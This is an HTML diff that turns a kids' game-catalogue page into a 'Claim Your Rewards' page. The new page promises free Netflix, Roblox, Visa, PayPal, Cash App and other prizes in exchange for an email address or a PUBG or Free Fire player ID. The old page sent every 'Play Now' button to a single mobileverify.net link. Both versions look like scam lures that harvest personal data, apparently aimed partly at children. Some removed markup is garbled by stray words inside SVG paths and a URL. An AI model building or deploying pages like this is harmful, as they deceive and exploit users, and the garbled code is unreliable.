@@ -1,316 +1,240 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>games.ixgy - Fun Kids Games</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        .scrollbar-thin::-webkit-scrollbar {
-            height: 6px;
-        }
-        .scrollbar-thin::-webkit-scrollbar-thumb {
-            background: #fbbf24;
-            border-radius: 3px;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Claim Your Rewards</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    .service-card img {
+      object-fit: contain;
+      width: 100%;
+      max-height: 100%;
+    }
+    @media (max-width: 640px) {
+      .service-card {
+        padding: 0.75rem;
+      }
+      .service-card img {
+        max-height: 2.5rem;
+      }
+      .service-card p {
+        font-size: 0.875rem;
+      }
+    }
+    @media (min-width: 1024px) {
+      .service-card {
+        padding: 1rem;
+      }
+      .service-card img {
+        max-height: 3rem;
+      }
+    }
+  </style>
 </head>
-<body class="bg-gray-900 text-white font-sans">
-    <!-- App Bar -->
-    <header class="bg-gray-700 sticky top-0 z-20 shadow-lg">
-        <div class="container mx-auto px-4 py-3 flex items-center justify-between">
-            <span class="text-xl sm:text-2xl font-bold text-amber-400 animate-bounce" style="font-family: 'Comic Sans MS', cursive;">games.ixgy</span>
-            <input type="search" placeholder="Find games!" class="ml-2 flex-1 max-w-[160px] bg-gray-600 text-white px-2 py-1 rounded-full focus:outline-none focus:ring-2 focus:ring-amber-400 transition text-sm" />
-        </div>
-    </header>
+<body class="bg-gradient-to-br from-blue-600 to-purple-700 min-h-screen flex items-center justify-center p-4 sm:p-6">
+  <div class="bg-white rounded-3xl shadow-2xl p-4 sm:p-6 max-w-5xl w-full space-y-6 sm:space-y-8">
+    <div class="text-center">
+      <h1 class="text-3xl sm:text-4xl font-extrabold text-gray-800 mb-2">🎉 Claim Your Rewards!</h1>
+      <p class="text-gray-700 text-base sm:text-lg">Pick a reward, enter your email, and claim your prize instantly!</p>
+    </div>
 
-    <!-- Featured Games - Horizontal Scroll -->
-    <section class="container mx-auto px-4 mt-4">
-        <h2 class="text-lg sm:text-xl font-bold text-pink-500 mb-2">Super Fun Games!</h2>
-        <div class="flex gap-4 overflow-x-auto pb-3 scrollbar-thin">
-            <!-- Minecraft -->
-            <div class="min-w-[150px] bg-gray-800 rounded-lg shadow-md transition transform hover:-translate-y-2 hover:scale-105 duration-300">
-                <div class="relative aspect-[3/4] overflow-hidden">
-                    <img src="https://upload.wikimedia.org/wikipedia/en/5/51/Minecraft_cover.png" alt="Minecraft" class="w-full h-full object-cover rounded-t-lg transition-transform duration-300 hover:scale-110">
-                </div>
-                <div class="p-3">
-                    <div class="flex items-center justify-between">
-                        <span class="font-bold text-xs sm:text-sm text-teal-300">Minecraft</span>
-                        <span class="text-amber-400 text-xs flex items-center">
-                            <svg class="w-3 h-3 mr-1" fill="currentColor" viewBox="0 0 20 20">
-                                <path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.561-.955L10 0l2.95 5.955 6.561.955-4.756 4.635 1.123 6.545z"/>
-                            </svg>4.8
-                        </span>
-                    </div>
-                    <p class="text-xs text-gray-400 truncate mt-1">Build cool worlds!</p>
-                    <a href="https://mobileverify.net/cl/v/6d4w7m" class="mt-2 w-full bg-teal-500 text-gray-900 rounded-full py-1.5 text-xs sm:text-sm font-bold hover:bg-teal-600 transition block text-center">Play Now!</a>
-                </div>
-            </div>
-            <!-- Fortnite -->
-            <div class="min-w-[150px] bg-gray-800 rounded-lg shadow-md transition transform hover:-translate-y-2 hover:scale-105 duration-300">
-                <div class="relative aspect-[3/4] overflow-hidden">
-                    <img src="https://upload.wikimedia.org/wikipedia/en/7/76/Fortnite_Battle_Royale.jpg" alt="Fortnite" class="w-full h-full object-cover rounded-t-lg transition-transform duration-300 hover:scale-110">
-                </div>
-                <div class="p-3">
-                    <div class="flex items-center justify-between">
-                        <span class="font-bold text-xs sm:text-sm text-teal-300">Fortnite</span>
-                        <span class="text-amber-400 text-xs flex items-center">
-                            <svg class="w-3 h-3 mr-1" fill="currentColor" viewBox="0 0 20 20">
-                                <path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.561-.955L10 0l2.95 5.955 6.561.955-4.756 4.635 1.123 6.545z"/>
-                            </svg>4.3
-                        </span>
-                    </div>
-                    <p class="text-xs text-gray-400 truncate mt-1">Battle with friends!</p>
-                    <a href="https://mobileverify.net/cl/v/6d4w7m" class="mt-2 w-full bg-teal-500 text-gray-900 rounded-full py-1.5 text-xs sm:text-sm font-bold hover:bg-teal-600 transition block text-center">Play Now!</a>
-                </div>
-            </div>
-            <!-- FIFA 23 -->
-            <div class="min-w-[150px] bg-gray-800 rounded-lg shadow-md transition transform hover:-translate-y-2 hover:scale-105 duration-300">
-                <div class="relative aspect-[3/4] overflow-hidden">
-                    <img src="https://upload.wikimedia.org/wikipedia/en/5/5e/FIFA_23_cover.jpg" alt="FIFA 23" class="w-full h-full object-cover rounded-t-lg transition-transform duration-300 hover:scale-110">
-                </div>
-                <div class="p-3">
-                    <div class="flex items-center justify-between">
-                        <span class="font-bold text-xs sm:text-sm text-teal-300">FIFA 23</span>
-                        <span class="text-amber-400 text-xs flex items-center">
-                            <svg class="w-3 h-3 mr-1" fill="currentColor" viewBox="0 0 20 20">
-                                <path d="M10 15l-5.878 wypadki 3.09 1.123-6.545L.489 6.91l6.561-.955L10 0l2.95 5.955 6.561.955-4.756 4.635 1.123 6.545z"/>
-                            </svg>4.5
-                        </span>
-                    </div>
-                    <p class="text-xs text-gray-400 truncate mt-1">Play football matches!</p>
-                    <a href="https://mobileverify.net/cl/v/6d4w7m" class="mt-2 w-full bg-teal-500 text-gray-900 rounded-full py-1.5 text-xs sm:text-sm font-bold hover:bg-teal-600 transition block text-center">Play Now!</a>
-                </div>
-            </div>
-            <!-- Roblox -->
-            <div class="min-w-[150px] bg-gray-800 rounded-lg shadow-md transition transform hover:-translate-y-2 hover:scale-105 duration-300">
-                <div class="relative aspect-[3/4] overflow-hidden">
-                    <img src="https://upload.wikimedia.org/wikipedia/en/6/6b/Roblox_cover.png" alt="Roblox" class="w-full h-full object-cover rounded-t-lg transition-transform duration-300 hover:scale-110">
-                </div>
-                <div class="p-3">
-                    <div class="flex items-center justify-between">
-                        <span class="font-bold text-xs sm:text-sm text-teal-300">Roblox</span>
-                        <span class="text-amber-400 text-xs flex items-center">
-                            <svg class="w-3 h-3 mr-1" fill="currentColor" viewBox="0 0 20 20">
-                                <path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.561-.955L10 0l2.95 5.955 6.561.955-4.756 4.635 1.123 6.545z"/>
-                            </svg>4.4
-                        </span>
-                    </div>
-                    <p class="text-xs text-gray-400 truncate mt-1">Create & play worlds!</p>
-                    <a href="https://mobileverify.net/cl/v/6d4w7m" class="mt-2 w-full bg-teal-500 text-gray-900 rounded-full py-1.5 text-xs sm:text-sm font-bold hover:bg-teal-600 transition block text-center">Play Now!</a>
-                </div>
-            </div>
-        </div>
-    </section>
+    <!-- Service Icons -->
+    <div id="serviceSelection" class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 xl:grid-cols-4 gap-4 sm:gap-6 pt-4 sm:pt-6">
+      <!-- Netflix -->
+      <div onclick="showEmailInput('Netflix')" class="service-card cursor-pointer bg-gray-100 rounded-xl p-3 sm:p-4 text-center hover:bg-gray-200 transition">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="h-10 sm:h-12 mb-2 mx-auto">
+        <p class="font-semibold text-red-600">Netflix</p>
+      </div>
 
-    <!-- More Games - Grid -->
-    <section class="container mx-auto px-4 mt-4 mb-12">
-        <h2 class="text-lg sm:text-xl font-bold text-pink-500 mb-2">More Cool Games!</h2>
-        <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4">
-            <!-- 1 -->
-            <div class="bg-gray-800 rounded-lg shadow-md flex flex-col transition transform hover:-translate-y-2 hover:scale-105 duration-300">
-                <div class="relative aspect-[3/4] overflow-hidden">
-                    <img src="https://upload.wikimedia.org/wikipedia/en/0/0c/Witcher_3_cover_art.jpg" alt="The Witcher 3" class="w-full h-full object-cover rounded-t-lg transition-transform duration-300 hover:scale-110">
-                </div>
-                <div class="p-3 flex-1 flex flex-col">
-                    <span class="font-bold text-xs sm:text-sm text-teal-300 truncate">The Witcher 3</span>
-                    <span class="text-amber-400 text-xs flex items-center">
-                        <svg class="w-3 h-3 mr-1" fill="currentColor" viewBox="0 0 20 20">
-                            <path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.561-.955L10 0l2.95 5.955 6.561.955-4.756 4.635 1.123 6.545z"/>
-                        </svg>4.9
-                    </span>
-                    <p class="text-xs text-gray-400 truncate mt-1">Epic monster hunting!</p>
-                    <a href="https://mobileverify.net/cl/v/6d4w7m" class="mt-2 w-full bg-teal-500 text-gray-900 rounded-full py-1.5 text-xs font-bold hover:bg-teal-600 transition block text-center">Play Now!</a>
-                </div>
-            </div>
-            <!-- 2 -->
-            <div class="bg-gray-800 rounded-lg shadow-md flex flex-col transition transform hover:-translate-y-2 hover:scale-105 duration-300">
-                <div class="relative aspect-[3/4] overflow-hidden">
-                    <img src="https://upload.wikimedia.org/wikipedia/en/4/44/Red_Dead_Redemption_II.jpg" alt="Red Dead Redemption 2" class="w-full h-full object-cover rounded-t-lg transition-transform duration-300 hover:scale-110">
-                </div>
-                <div class="p-3 flex-1 flex flex-col">
-                    <span class="font-bold text-xs sm:text-sm text-teal-300 truncate">Red Dead 2</span>
-                    <span class="text-amber-400 text-xs flex items-center">
-                        <svg class="w-3 h-3 mr-1" fill="currentColor" viewBox="0 0 20 20">
-                            <path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.561-.955L10 0l2.95 5.955 6.561.955-4.756 4.635 1.123 6.545z"/>
-                        </svg>4.8
-                    </span>
-                    <p class="text-xs text-gray-400 truncate mt-1">Wild West adventure!</p>
-                    <a href="https://mobileverify.net/cl/v/6d4w7m" class="mt-2 w-full bg-teal-500 text-gray-900 rounded-full py-1.5 text-xs font-bold hover:bg-teal-600 transition block text-center">Play Now!</a>
-                </div>
-            </div>
-            <!-- 3 -->
-            <div class="bg-gray-800 rounded-lg shadow-md flex flex-col transition transform hover:-translate-y-2 hover:scale-105 duration-300">
-                <div class="relative aspect-[3/4] overflow-hidden">
-                    <img src="https://upload.wikimedia.org/wikipedia/en/a/a5/Grand_Theft_Auto_V.png" alt="GTA V" class="w-full h-full object-cover rounded-t-lg transition-transform duration-300 hover:scale-110">
-                </div>
-                <div class="p-3 flex-1 flex flex-col">
-                    <span class="font-bold text-xs sm:text-sm text-teal-300 truncate">GTA V</span>
-                    <span class="text-amber-400 text-xs flex items-center">
-                        <svg class="w-3 h-3 mr-1" fill="currentColor" viewBox="0 0 20 20">
-                            <path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.561-.955L10 0l2.95 5.955 6.561.955-4.756 4.635 1.123 6.545z"/>
-                        </svg>4.7
-                    </span>
-                    <p class="text-xs text-gray-400 truncate mt-1">Open world chaos!</p>
-                    <a href="https://mobileverify.net/cl/v/6d4w7m" class="mt-2 w-full bg-teal-500 text-gray-900 rounded-full py-1.5 text-xs font-bold hover:bg-teal-600 transition block text-center">Play Now!</a>
-                </div>
-            </div>
-            <!-- 4 -->
-            <div class="bg-gray-800 rounded-lg shadow-md flex flex-col transition transform hover:-translate-y-2 hover:scale-105 duration-300">
-                <div class="relative aspect-[3/4] overflow-hidden">
-                    <img src="https://upload.wikimedia.org/wikipedia/en/8/8d/Super_Mario_Odyssey.jpg" alt="Super Mario Odyssey" class="w-full h-full object-cover rounded-t-lg transition-transform duration-300 hover:scale-110">
-                </div>
-                <div class="p-3 flex-1 flex flex-col">
-                    <span class="font-bold text-xs sm:text-sm text-teal-300 truncate">Super Mario Odyssey</span>
-                    <span class="text-amber-400 text-xs flex items-center">
-                        <svg class="w-3 h-3 mr-1" fill="currentColor" viewBox="0 0 20 20">
-                            <path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.561-.955L sportive 10 0l2.95 5.955 6.561.955-4.756 4.635 1.123 6.545z"/>
-                        </svg>4.7
-                    </span>
-                    <p class="text-xs text-gray-400 truncate mt-1">Jump into adventure!</p>
-                    <a href="https://mobileverify.net/cl/v/6d4w7m" class="mt-2 w-full bg-teal-500 text-gray-900 rounded-full py-1.5 text-xs font-bold hover:bg-teal-600 transition block text-center">Play Now!</a>
-                </div>
-            </div>
-            <!-- 5 -->
-            <div class="bg-gray-800 rounded-lg shadow-md flex flex-col transition transform hover:-translate-y-2 hover:scale-105 duration-300">
-                <div class="relative aspect-[3/4] overflow-hidden">
-                    <img src="https://upload.wikimedia.org/wikipedia/en/9/9a/Among_Us_cover_art.jpg" alt="Among Us" class="w-full h-full object-cover rounded-t-lg transition-transform duration-300 hover:scale-110">
-                </div>
-                <div class="p-3 flex-1 flex flex-col">
-                    <span class="font-bold text-xs sm:text-sm text-teal-300 truncate">Among Us</span>
-                    <span class="text-amber-400 text-xs flex items-center">
-                        <svg class="w-3 h-3 mr-1" fill="currentColor" viewBox="0 0 20 20">
-                            <path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.561-.955L10 0l2.95 5.955 6.561.955-4.756 4.635 1.123 6.545z"/>
-                        </svg>4.2
-                    </span>
-                    <p class="text-xs text-gray-400 truncate mt-1">Find the impostor!</p>
-                    <a href="https://mobileverify.net/cl/v/6d4w7m" class="mt-2 w-full bg-teal-500 text-gray-900 rounded-full py-1.5 text-xs font-bold hover:bg-teal-600 transition block text-center">Play Now!</a>
-                </div>
-            </div>
-            <!-- 6 -->
-            <div class="bg-gray-800 rounded-lg shadow-md flex flex-col transition transform hover:-translate-y-2 hover:scale-105 duration-300">
-                <div class="relative aspect-[3/4] overflow-hidden">
-                    <img src="https://upload.wikimedia.org/wikipedia/en/7/7b/Pok%C3%A9mon_GO_cover.png" alt="Pokemon Go" class="w-full h-full object-cover rounded-t-lg transition-transform duration-300 hover:scale-110">
-                </div>
-                <div class="p-3 flex-1 flex flex-col">
-                    <span class="font-bold text-xs sm:text-sm text-teal-300 truncate">Pokemon Go</span>
-                    <span class="text-amber-400 text-xs flex items-center">
-                        <svg class="w-3 h-3 mr-1" fill="currentColor" viewBox="0  podejście 0 20 20">
-                            <path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.561-.955L10 0l2.95 5.955 6.561.955-4.756 4.635 1.123 6.545z"/>
-                        </svg>4.4
-                    </span>
-                    <p class="text-xs text-gray-400 truncate mt-1">Catch them all outside!</p>
-                    <a href="https://mobileverify.net/cl/v/anking 6d4w7m" class="mt-2 w-full bg-teal-500 text-gray-900 rounded-full py-1.5 text-xs font-bold hover:bg-teal-600 transition block text-center">Play Now!</a>
-                </div>
-            </div>
-            <!-- 7 -->
-            <div class="bg-gray-800 rounded-lg shadow-md flex flex-col transition transform hover:-translate-y-2 hover:scale-105 duration-300">
-                <div class="relative aspect-[3/4] overflow-hidden">
-                    <img src="https://upload.wikimedia.org/wikipedia/en/7/7e/Brawl_Stars_logo.png" alt="Brawl Stars" class="w-full h-full object-cover rounded-t-lg transition-transform duration-300 hover:scale-110">
-                </div>
-                <div class="p-3 flex-1 flex flex-col">
-                    <span class="font-bold text-xs sm:text-sm text-teal-300 truncate">Brawl Stars</span>
-                    <span class="text-amber-400 text-xs flex items-center">
-                        <svg class="w-3 h-3 mr-1" fill="currentColor" viewBox="0 0 20 20">
-                            <path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.561-.955L10 0l2.95 5.955 6.561.955-4.756 4.635 1.123 6.545z"/>
-                        </svg>4.3
-                    </span>
-                    <p class="text-xs text-gray-400 truncate mt-1">Fast-paced battles!</p>
-                    <a href="https://mobileverify.net/cl/v/6d4w7m" class="mt-2 w-full bg-teal-500 text-gray-900 rounded-full py-1.5 text-xs font-bold hover:bg-teal-600 transition block text-center">Play Now!</a>
-                </div>
-            </div>
-            <!-- 8 -->
-            <div class="bg-gray-800 rounded-lg shadow-md flex flex-col transition transform hover:-translate-y-2 hover:scale-105 duration-300">
-                <div class="relative aspect-[3/4] overflow-hidden">
-                    <img src="https://upload.wikimedia.org/wikipedia/en/7/7e/Candy_Crush_Saga_icon.png" alt="Candy Crush Saga" class="w-full h-full object-cover rounded-t-lg transition-transform duration-300 hover:scale-110">
-                </div>
-                <div class="p-3 flex-1 flex flex-col">
-                    <span class="font-bold text-xs sm:text-sm text-teal-300 truncate">Candy Crush</span>
-                    <span class="text-amber-400 text-xs flex items-center">
-                        <svg class="w-3 h-3 mr-1" fill="currentColor" viewBox="0 0 20 20">
-                            <path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.561-.955L10 0l2.95 5.955 6.561.955-4.756 4.635 1.123 6.545z"/>
-                        </svg>4.1
-                    </span>
-                    <p class="text-xs text-gray-400 truncate mt-1">Match the candies!</p>
-                    <a href="https://mobileverify.net/cl/v/6d4w7m" class="mt-2 w-full bg-teal-500 text-gray-900 rounded-full py-1.5 text-xs font-bold hover:bg-teal-600 transition block text-center">Play Now!</a>
-                </div>
-            </div>
-            <!-- 9 -->
-            <div class="bg-gray-800 rounded-lg shadow-md flex flex-col transition transform hover:-translate-y-2 hover:scale-105 duration-300">
-                <div class="relative aspect-[3/4] overflow-hidden">
-                    <img src="https://upload.wikimedia.org/wikipedia/en/1/1d/Subway_Surfers_app_icon.png" alt="Subway Surfers" class="w-full h-full object-cover rounded-t-lg transition-transform duration-300 hover:scale-110">
-                </div>
-                <div class="p-3 flex-1 flex flex-col">
-                    <span class="font-bold text-xs sm:text-sm text-teal-300 truncate">Subway Surfers</span>
-                    <span class="text-amber-400 text-xs flex items-center">
-                        <svg class="w-3 h-3 mr-1" fill="currentColor" viewBox="0 0 20 20">
-                            <path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.561-.955L10 0l2.95 5.955 6.561.955-4.756 4.635 1.123 6.545z"/>
-                        </svg>4.5
-                    </span>
-                    <p class="text-xs text-gray-400 truncate mt-1">Run & dodge trains!</p>
-                    <a href="https://mobileverify.net/cl/v/6d4w7m" class="mt-2 w-full bg-teal-500 text-gray-900 rounded-full py-1.5 text-xs font-bold hover:bg-teal-600 transition block text-center">Play Now!</a>
-                </div>
-            </div>
-            <!-- 10 -->
-            <div class="bg-gray-800 rounded-lg shadow-md flex flex-col transition transform hover:-translate-y-2 hover:scale-105 duration-300">
-                <div class="relative aspect-[3/4] overflow-hidden">
-                    <img src="https://upload.wikimedia.org/wikipedia/en/5/5f/Clash_of_Clans_app_icon.png" alt="Clash of Clans" class="w-full h-full object-cover rounded-t-lg transition-transform duration-300 hover:scale-110">
-                </div>
-                <div class="p-3 flex-1 flex flex-col">
-                    <span class="font-bold text-xs sm:text-sm text-teal-300 truncate">Clash of Clans</span>
-                    <span class="text-amber-400 text-xs flex items-center">
-                        <svg class="w-3 h-3 mr-1" fill="currentColor" viewBox="0 0 20 20">
-                            <path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.561-.955L10 0l2.95 5.955 6.561.955-4.756 4.635 1.123 6.545z"/>
-                        </svg>4.6
-                    </span>
-                    <p class="text-xs text-gray-400 truncate mt-1">Build your village!</p>
-                    <a href="https://mobileverify.net/cl/v/6d4w7m" class="mt-2 w-full bg-teal-500 text-gray-900 rounded-full py-1.5 text-xs font-bold hover:bg-teal-600 transition block text-center">Play Now!</a>
-                </div>
-            </div>
-            <!-- 11 -->
-            <div class="bg-gray-800 rounded-lg shadow-md flex flex-col transition transform hover:-translate-y-2 hover:scale-105 duration-300">
-                <div class="relative aspect-[3/4] overflow-hidden">
-                    <img src="https://upload.wikimedia.org/wikipedia/en/6/6f/Call_of_Duty_Mobile_app_icon.png" alt="Call of Duty Mobile" class="w-full h-full object-cover rounded-t-lg transition-transform duration-300 hover:scale-110">
-                </div>
-                <div class="p-3 flex-1 flex flex-col">
-                    <span class="font-bold text-xs sm:text-sm text-teal-300 truncate">COD Mobile</span>
-                    <span class="text-amber-400 text-xs flex items-center">
-                        <svg class="w-3 h-3 mr-1" fill="currentColor" viewBox="0 0 20 20">
-                            <path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.561-.955L10 0l2.95 5.955 6.561.955-4.756 4.635 1.123 6.545z"/>
-                        </svg>4.5
-                    </span>
-                    <p class="text-xs text-gray-400 truncate mt-1">Mobile FPS action!</p>
-                    <a href="https://mobileverify.net/cl/v/6d4w7m" class="mt-2 w-full bg-teal-500 text-gray-900 rounded-full py-1.5 text-xs font-bold hover:bg-teal-600 transition block text-center">Play Now!</a>
-                </div>
-            </div>
-            <!-- 12 -->
-            <div class="bg-gray-800 rounded-lg shadow-md flex flex-col transition transform hover:-translate-y-2 hover:scale-105 duration-300">
-                <div class="relative aspect-[3/4] overflow-hidden">
-                    <img src="https://upload.wikimedia.org/wikipedia/en/6/6b/Roblox_cover.png" alt="Roblox" class="w-full h-full object-cover rounded-t-lg transition-transform duration-300 hover:scale-110">
-                </div>
-                <div class="p-3 flex-1 flex flex-col">
-                    <span class="font-bold text-xs sm:text-sm text-teal-300 truncate">Roblox</span>
-                    <span class="text-amber-400 text-xs flex items-center">
-                        <svg class="w-3 h-3 mr-1" fill="currentColor" viewBox="0 0 20 20">
-                            <path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.561-.955L10 0l2.95 5.955 6.561.955-4.756 4.635 1.123 6.545z"/>
-                        </svg>4.4
-                    </span>
-                    <p class="text-xs text-gray-400 truncate mt-1">Create & play worlds!</p>
-                    <a href="https://mobileverify.net/cl/v/6d4w7m" class="mt-2 w-full bg-teal-500 text-gray-900 rounded-full py-1.5 text-xs font-bold hover:bg-teal-600 transition block text-center">Play Now!</a>
-                </div>
-            </div>
-        </div>
-        <!-- Get More Games Button -->
-        <div class="text-center mt-6">
-            <a href="https://mobileverify.net/cl/v/6d4w7m" class="inline-block bg-teal-500 text-gray-900 font-bold py-2 px-6 rounded-full shadow-lg hover:bg-teal-600 transition text-sm sm:text-base">Get More Games!</a>
-        </div>
-    </section>
+      <!-- Roblox -->
+      <div onclick="showEmailInput('Roblox')" class="service-card cursor-pointer bg-gray-100 rounded-xl p-3 sm:p-4 text-center hover:bg-gray-200 transition">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Roblox_Logo.svg" alt="Roblox" class="h-10 sm:h-12 mb-2 mx-auto">
+        <p class="font-semibold text-black">Roblox</p>
+      </div>
 
-    <!-- Footer -->
-    <footer class="bg-gray-700 py-4">
-        <div class="container mx-auto px-4 text-center">
-            <p class="text-gray-400 text-xs">© 2025 games.ixgy. Fun for Kids!</p>
-        </div>
-    </footer>
+      <!-- Visa Gift Card -->
+      <div onclick="showEmailInput('Visa')" class="service-card cursor-pointer bg-gray-100 rounded-xl p-3 sm:p-4 text-center hover:bg-gray-200 transition">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/1200px-Visa_Inc._logo.svg.png" alt="Visa Gift Card" class="h-10 sm:h-12 mb-2 mx-auto">
+        <p class="font-semibold text-blue-600">Visa</p>
+      </div>
+
+      <!-- Mastercard Gift Card -->
+      <div onclick="showEmailInput('Mastercard')" class="service-card cursor-pointer bg-gray-100 rounded-xl p-3 sm:p-4 text-center hover:bg-gray-200 transition">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard Gift Card" class="h-10 sm:h-12 mb-2 mx-auto">
+        <p class="font-semibold text-red-600">Mastercard</p>
+      </div>
+
+      <!-- Disney+ -->
+      <div onclick="showEmailInput('Disney+')" class="service-card cursor-pointer bg-gray-100 rounded-xl p-3 sm:p-4 text-center hover:bg-gray-200 transition">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg" alt="Disney+" class="h-10 sm:h-12 mb-2 mx-auto">
+        <p class="font-semibold text-blue-500">Disney+</p>
+      </div>
+
+      <!-- Starbucks -->
+      <div onclick="showEmailInput('Starbucks')" class="service-card cursor-pointer bg-gray-100 rounded-xl p-3 sm:p-4 text-center hover:bg-gray-200 transition">
+        <img src="https://upload.wikimedia.org/wikipedia/en/d/d3/Starbucks_Corporation_Logo_2011.svg" alt="Starbucks" class="h-10 sm:h-12 mb-2 mx-auto">
+        <p class="font-semibold text-green-500">Starbucks</p>
+      </div>
+
+      <!-- Hulu -->
+      <div onclick="showEmailInput('Hulu')" class="service-card cursor-pointer bg-gray-100 rounded-xl p-3 sm:p-4 text-center hover:bg-gray-200 transition">
+        <img src="https://logo.wine/logo/Hulu/Hulu-Logo.wine.svg" alt="Hulu" class="h-8 sm:h-10 mb-2 mx-auto">
+        <p class="font-semibold text-green-600">Hulu</p>
+      </div>
+
+      <!-- Cash App -->
+      <div onclick="showEmailInput('Cash App')" class="service-card cursor-pointer bg-gray-100 rounded-xl p-3 sm:p-4 text-center hover:bg-gray-200 transition">
+        <img src="https://logo.wine/logo/Cash_App/Cash_App-Logo.wine.svg" alt="Cash App" class="h-10 sm:h-12 mb-2 mx-auto">
+        <p class="font-semibold text-green-700">Cash App</p>
+      </div>
+
+      <!-- Spotify -->
+      <div onclick="showEmailInput('Spotify')" class="service-card cursor-pointer bg-gray-100 rounded-xl p-3 sm:p-4 text-center hover:bg-gray-200 transition">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Spotify_logo_without_text.svg/1200px-Spotify_logo_without_text.svg.png" alt="Spotify" class="h-10 sm:h-12 mb-2 mx-auto">
+        <p class="font-semibold text-green-600">Spotify</p>
+      </div>
+
+      <!-- PUBG -->
+      <div onclick="showPubgForm()" class="service-card cursor-pointer bg-gray-100 rounded-xl p-3 sm:p-4 text-center hover:bg-gray-200 transition">
+        <img src="https://seeklogo.com/images/P/PUBG-logo-DD0710FBB9-seeklogo.com.png" alt="PUBG" class="h-10 sm:h-12 mb-2 mx-auto">
+        <p class="font-semibold text-blue-800">PUBG</p>
+      </div>
+
+      <!-- Free Fire -->
+      <div onclick="showFreeFireForm()" class="service-card cursor-pointer bg-gray-100 rounded-xl p-3 sm:p-4 text-center hover:bg-gray-200 transition">
+        <img src="https://logo.wine/logo/Garena_Free_Fire/Garena_Free_Fire-Logo.wine.png" alt="Free Fire" class="h-10 sm:h-12 mb-2 mx-auto">
+        <p class="font-semibold text-orange-600">Free Fire</p>
+      </div>
+
+      <!-- PayPal -->
+      <div onclick="showEmailInput('PayPal')" class="service-card cursor-pointer bg-gray-100 rounded-xl p-3 sm:p-4 text-center hover:bg-gray-200 transition">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal" class="h-10 sm:h-12 mb-2 mx-auto">
+        <p class="font-semibold text-blue-600">PayPal</p>
+      </div>
+    </div>
+
+    <!-- Description and Email Input Section (hidden by default) -->
+    <div id="descriptionAndEmail" class="hidden text-center space-y-4">
+      <p id="serviceDescription" class="text-gray-700 text-lg sm:text-xl font-medium"></p>
+      <input id="emailInput" type="text" placeholder="Enter your email" class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 transition text-sm sm:text-base" required />
+      <button onclick="handleRedirect()" class="bg-blue-600 text-white px-6 py-3 rounded-lg shadow-md hover:bg-blue-700 transition text-sm sm:text-base">Claim Reward</button>
+      <!-- Back Button -->
+      <button onclick="backToSelection()" class="bg-gray-300 text-gray-800 px-6 py-3 rounded-lg shadow-md hover:bg-gray-400 transition mt-4 text-sm sm:text-base">Back to Rewards</button>
+    </div>
+
+    <!-- PUBG ID Form Section (hidden by default) -->
+    <div id="pubgForm" class="hidden text-center space-y-4">
+      <p id="pubgDescription" class="text-gray-700 text-lg sm:text-xl font-medium">Enter your PUBG ID to claim your reward!</p>
+      <input id="pubgIdInput" type="text" placeholder="Enter your PUBG ID" class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 transition text-sm sm:text-base" required />
+      <button onclick="handlePubgRedirect()" class="bg-blue-600 text-white px-6 py-3 rounded-lg shadow-md hover:bg-blue-700 transition text-sm sm:text-base">Submit PUBG ID</button>
+      <!-- Back Button -->
+      <button onclick="backToSelection()" class="bg-gray-300 text-gray-800 px-6 py-3 rounded-lg shadow-md hover:bg-gray-400 transition mt-4 text-sm sm:text-base">Back to Rewards</button>
+    </div>
+
+    <!-- Free Fire ID Form Section (hidden by default) -->
+    <div id="freeFireForm" class="hidden text-center space-y-4">
+      <p id="freeFireDescription" class="text-gray-700 text-lg sm:text-xl font-medium">Enter your Free Fire ID to claim your reward!</p>
+      <input id="freeFireIdInput" type="text" placeholder="Enter your Free Fire ID" class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 transition text-sm sm:text-base" required />
+      <button onclick="handleFreeFireRedirect()" class="bg-blue-600 text-white px-6 py-3 rounded-lg shadow-md hover:bg-blue-700 transition text-sm sm:text-base">Submit Free Fire ID</button>
+      <!-- Back Button -->
+      <button onclick="backToSelection()" class="bg-gray-300 text-gray-800 px-6 py-3 rounded-lg shadow-md hover:bg-gray-400 transition mt-4 text-sm sm:text-base">Back to Rewards</button>
+    </div>
+  </div>
+
+  <script>
+    function showEmailInput(service) {
+      // Hide the service icons grid and other forms
+      document.getElementById('serviceSelection').style.display = 'none';
+      document.getElementById('pubgForm').style.display = 'none';
+      document.getElementById('freeFireForm').style.display = 'none';
+
